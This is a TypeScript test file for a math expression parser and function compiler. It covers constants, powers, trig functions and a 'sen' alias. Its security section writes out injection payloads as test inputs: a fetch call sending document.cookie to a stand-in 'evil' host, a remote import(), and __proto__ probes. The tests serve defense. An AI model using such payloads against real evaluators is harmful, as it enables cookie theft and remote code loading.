import { parseMathExpr, compileMathFunc } from './math.ts'

const near = (a: number, b: number, tol = 1e-9) => Math.abs(a - b) < tol
let pass = 0
let fail = 0
function check(name: string, ok: boolean) {
  if (ok) pass++; else { fail++; console.log('FAIL:', name) }
}

// parseMathExpr: constant expressions
check('pi/4', near(parseMathExpr('pi/4'), Math.PI / 4))
check('10^-1', near(parseMathExpr('10^-1'), 0.1))
check('1/3', near(parseMathExpr('1/3'), 1 / 3))
check('2^10', parseMathExpr('2^10') === 1024)
check('2.5e3', near(parseMathExpr('2.5e3'), 2500))
check('0.95', near(parseMathExpr('0.95'), 0.95))
check('e^2', near(parseMathExpr('e^2'), Math.E ** 2))
check('x -> NaN', Number.isNaN(parseMathExpr('x')))

// compileMathFunc
check('x^2-4 @3', near(compileMathFunc('x^2 - 4')(3), 5))
check('x**2 @5', near(compileMathFunc('x**2')(5), 25))
check('sin(x) @pi/2', near(compileMathFunc('sin(x)')(Math.PI / 2), 1))
check('e^x @1', near(compileMathFunc('e^x')(1), Math.E))
check('sen(x) alias', near(compileMathFunc('sen(0)')(0), 0))
check('sqrt(x) @9', near(compileMathFunc('sqrt(x)')(9), 3))
check('-x**2 @2', near(compileMathFunc('-x**2')(2), -4))

// Security: malicious inputs must be rejected / fail
check('reject document.cookie', Number.isNaN(parseMathExpr('document.cookie')))
check('reject __proto__', Number.isNaN(parseMathExpr('__proto__')))
let threw = false
try { compileMathFunc('x) + (()=>{fetch("http://evil?c="+document.cookie)})()') } catch { threw = true }
check('reject arrow/fetch payload', threw)
threw = false
try { compileMathFunc('x.__class__') } catch { threw = true }
check('reject attribute access', threw)
threw = false
try { compileMathFunc('import("http://evil")') } catch { threw = true }
check('reject import()', threw)
threw = false
try { compileMathFunc('x' + '1'.repeat(300)) } catch { threw = true }
check('reject too long', threw)

console.log(`\n${pass} passed, ${fail} failed`)
if (fail) throw new Error(`${fail} security/math check(s) failed`)
